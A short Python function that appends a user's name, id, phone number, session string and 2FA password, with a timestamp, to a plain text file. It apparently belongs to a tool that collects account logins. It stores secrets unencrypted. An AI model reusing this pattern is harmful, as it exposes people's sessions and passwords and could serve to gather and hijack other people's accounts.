import asyncio
import time
from config import BASE_FILE

async def save_to_base(username, user_id, phone, session, twofa_password):
 
    registration_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    with open(BASE_FILE, 'a') as file:
        file.write(f"username: {username}\n")
        file.write(f"id: {user_id}\n")
        file.write(f"phone: {phone}\n")
        file.write(f"session: {session}\n")
        file.write(f"2fa: {twofa_password}\n")
        file.write(f"registration_time: {registration_time}\n")
        file.write("-" * 20 + "\n")
